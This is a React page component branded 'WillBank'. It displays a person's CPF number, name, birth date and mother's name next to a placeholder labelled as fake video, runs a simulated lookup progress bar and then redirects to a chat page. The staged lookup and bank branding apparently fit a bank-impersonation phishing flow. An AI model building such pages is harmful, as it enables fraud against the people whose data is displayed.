import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { CreditCard, User, Calendar, Users, Search, Volume2 } from "lucide-react";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import { CPFData } from "@/lib/cpf";
import { Progress } from "@/components/ui/progress";

const Video = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [progress, setProgress] = useState(0);
  const [showConsulta, setShowConsulta] = useState(false);

  const cpfData: CPFData | undefined = location.state?.cpfData;

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }

    // Simular progresso de loading
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setShowConsulta(true);
          // Após mostrar consulta, navegar para chat
          setTimeout(() => {
            navigate("/chat", { state: { cpfData } });
          }, 3000);
          return 100;
        }
        return prev + 1;
      });
    }, 50);

    return () => clearInterval(interval);
  }, [cpfData, navigate]);

  if (!cpfData) return null;

  const dataFields = [
    { icon: CreditCard, value: cpfData.cpf },
    { icon: User, value: cpfData.nome },
    { icon: Calendar, value: cpfData.dataNascimento },
    { icon: Users, value: cpfData.nomeMae },
  ];

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <WillBankHeader userName={cpfData.nome.split(' ')[0].toUpperCase()} />

      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
        <WillBankCard className="w-full max-w-2xl">
          <div className="space-y-6">
            {/* Progress bar at top */}
            <Progress value={progress} className="h-1.5" />

            {/* Video Placeholder */}
            <div className="relative aspect-video bg-gradient-to-br from-blue-900 via-blue-800 to-purple-900 rounded-xl overflow-hidden">
              {/* Fake video content */}
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="text-center">
                  <div className="w-48 h-48 mx-auto bg-primary rounded-lg flex items-center justify-center mb-4">
                    <span className="text-6xl">👩‍💼</span>
                  </div>
                </div>
              </div>
              
              {/* Audio Button Overlay */}
              <button className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-primary text-primary-foreground px-6 py-3 rounded-full flex items-center gap-2 font-semibold shadow-lg hover:bg-primary/90 transition">
                <Volume2 className="w-5 h-5" />
                Clique para ouvir
              </button>

              {/* Video controls */}
              <div className="absolute top-4 right-4 flex gap-2">
                <button className="bg-black/50 text-white px-3 py-1 rounded text-xs">
                  📋 Desanexar vídeo
                </button>
                <button className="bg-black/50 text-white px-3 py-1 rounded text-xs">
                  ⏭️ RGX
                </button>
              </div>
            </div>

            {/* User Data Card */}
            <div className="border-2 border-primary rounded-xl overflow-hidden">
              {/* Yellow top border already from Card */}
              <div className="divide-y divide-gray-100">
                {dataFields.map((field, index) => {
                  const Icon = field.icon;
                  return (
                    <div key={index} className="flex items-center gap-4 p-4">
                      <div className="w-10 h-10 bg-primary/10 rounded-full flex items-center justify-center">
                        <Icon className="w-5 h-5 text-primary" />
                      </div>
                      <span className="font-medium text-foreground">{field.value}</span>
                    </div>
                  );
                })}
                
                {/* Consulta Status */}
                <div className="flex items-center gap-4 p-4 bg-primary/10">
                  <div className="w-10 h-10 bg-primary/20 rounded-full flex items-center justify-center">
                    <Search className="w-5 h-5 text-primary" />
                  </div>
                  <span className="text-muted-foreground">
                    {showConsulta ? "Consulta finalizada!" : "Sua consulta está em andamento..."}
                  </span>
                </div>
              </div>
            </div>
          </div>
        </WillBankCard>
      </main>
    </div>
  );
};

export default Video;
